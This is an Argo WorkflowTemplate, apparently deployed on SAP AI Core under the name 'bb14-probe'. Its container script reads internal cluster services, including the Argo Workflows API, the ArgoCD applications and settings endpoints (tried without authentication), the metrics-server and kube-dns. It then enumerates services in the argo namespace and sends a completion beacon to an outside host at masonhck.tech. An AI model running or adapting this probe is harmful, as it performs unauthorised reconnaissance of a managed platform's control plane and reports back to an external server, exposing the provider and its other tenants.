apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-probe
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-probe"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-probe"
    ai.sap.com/version: "35.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - bash
      - -c
      - |
        echo "=== V35 INTERNAL SERVICE READ ==="
        echo "=== $(date -u) ==="

        CB="https://www.masonhck.tech/ssrf.php?src=sap-v35"

        # Direct reads of confirmed internal services
        echo "=== ARGO WORKFLOWS API (100.108.37.178:2746) ==="
        curl -sk --connect-timeout 5 "http://argo-server.argo.svc.cluster.local:2746/api/v1/workflows/rg-3ba0e0a4-cd927cab" 2>&1 | head -c 500
        echo ""
        curl -sk --connect-timeout 5 "http://100.108.37.178:2746/api/v1/info" 2>&1 | head -c 500
        echo ""

        echo "=== ARGOCD SERVER API (100.107.174.75) ==="
        curl -sk --connect-timeout 5 "https://argocd-server.argocd.svc.cluster.local/api/v1/applications" 2>&1 | head -c 500
        echo ""
        # ArgoCD without auth
        curl -sk --connect-timeout 5 "https://100.107.174.75/api/v1/applications" 2>&1 | head -c 500
        echo ""
        # ArgoCD settings
        curl -sk --connect-timeout 5 "https://argocd-server.argocd.svc.cluster.local/api/v1/settings" 2>&1 | head -c 500
        echo ""

        echo "=== METRICS SERVER (100.111.65.139) ==="
        curl -sk --connect-timeout 5 "https://metrics-server.kube-system.svc.cluster.local/apis/metrics.k8s.io/v1beta1/nodes" 2>&1 | head -c 500
        echo ""

        echo "=== KUBE-DNS ==="
        # Can we query kube-dns directly?
        dig @100.104.0.10 argocd-server.argocd.svc.cluster.local +short 2>&1
        dig @100.104.0.10 argo-server.argo.svc.cluster.local +short 2>&1

        echo "=== SCAN ARGO WORKFLOWS NAMESPACE ==="
        # Enumerate argo namespace services
        for svc in argo-server workflow-controller argo-ui minio; do
          ip=$(dig +short "$svc.argo.svc.cluster.local" 2>/dev/null | head -1)
          if [ -n "$ip" ]; then
            echo "FOUND: $svc.argo -> $ip"
            # Try to read from it
            curl -sk --connect-timeout 3 "http://$ip" 2>&1 | head -c 100
          fi
        done

        # Callback with summary
        curl -s "${CB}&data=v35-done" 2>/dev/null | head -c 20
        echo "=== V35 DONE $(date -u) ==="
